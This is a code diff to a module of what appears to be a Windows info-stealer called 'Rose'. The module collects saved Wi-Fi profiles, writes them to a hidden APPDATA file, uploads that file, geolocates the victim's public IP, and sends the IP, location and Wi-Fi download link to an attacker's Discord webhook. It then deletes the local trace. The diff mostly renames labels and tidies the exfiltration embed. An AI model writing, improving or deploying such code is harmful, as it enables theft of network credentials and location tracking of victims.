@@ -1,7 +1,7 @@
 import subprocess
 import os
 from config import Config
-from json import loads
+from datetime import datetime
 from __webhook import _WebhookX
 from dhooks import Embed
 from urllib.request import Request, urlopen
@@ -41,7 +41,7 @@ class Info():
     def main(self):
         wifi_profiles = self.get_wifi_profiles()
         rndm_strr = get_random_string(25)
-        self.path = f"{os.getenv('APPDATA')}\\ROSE_ON_TOP\\wifi-stealer_{rndm_strr}.txt"
+        self.path = os.path.join(os.getenv("APPDATA"), 'roseontop', f'wifi_profiles_{rndm_strr}.txt')
         with open(self.path, "w", encoding="utf-8") as file:
             for profile_name in wifi_profiles:
                 profile_output = self.get_wifi_profile_output(profile_name)
@@ -56,45 +56,38 @@ class Info():
             self.wif_dwnld_l = response.json().get("link", "Unknown")
         else:
             self.wif_dwnld_l = "Unknown"
-    
-    def global_info(self):
-        try:
-            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
-            if response.status_code == 200:
-                ipdata = response.json()
-                obj = {
-                    "Country": ipdata.get("country", "Unknown"),
-                    "City": ipdata.get("city", "Unknown"),
-                    "Postal": ipdata.get("postal", "Unknown"),
-                    "Latitude": ipdata.get("loc", "Unknown").split(",")[0],
-                    "Longitude": ipdata.get("loc", "Unknown").split(",")[1],
-                    "State": ipdata.get("region", "Unknown")
-                }
-                return obj
-            else:
-                return {}
-        except Exception:
-            return {}
 
     def send_data(self):
         webx = _WebhookX().get_object()
 
         self.main()
 
+        try:
+            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
+            if response.status_code == 200:
+                self.ipdata = response.json()
+        except Exception:
+            return {}
+
         embed = Embed(
-            description='IP & Wi-Fi Information',
+            title='Rose Report',
+            description='Rose Instance - IP and WIFI Information',
             color=cc.get_color(),
-            timestamp='now'
+            timestamp=datetime.now().isoformat()
         )
 
         embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
         embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
 
-        global_info_data = self.global_info()
-        ip_info = "\n".join([f"{key}: {value}" for key, value in global_info_data.items()])
-        embed.add_field(name='Victim IP data...', value=ip_info)
+        embed.add_field(name='IP', value=f'`{self.get_public_ip()}`', inline=False)
+        embed.add_field(name='Country', value=f'`{self.ipdata.get("country", "Unknown")}`', inline=False)
+        embed.add_field(name='City', value=f'`{self.ipdata.get("city", "Unknown")}`', inline=False)
+        embed.add_field(name='Postal', value=f'`{self.ipdata.get("postal", "Unknown")}`', inline=False)
+        embed.add_field(name='Latitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[0]}`', inline=False)
+        embed.add_field(name='Longtitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[1]}`', inline=False)
+        embed.add_field(name='State', value=f'`{self.ipdata.get("region", "Unknown")}`', inline=False)
 
-        embed.add_field(name='Victim Wi-Fi data...', value=f'[Wi-Fi data]({self.wif_dwnld_l})')
+        embed.add_field(name='WIFI', value=f'[Download]({self.wif_dwnld_l})', inline=False)
 
         webx.send(embed=embed)
         os.remove(self.path)
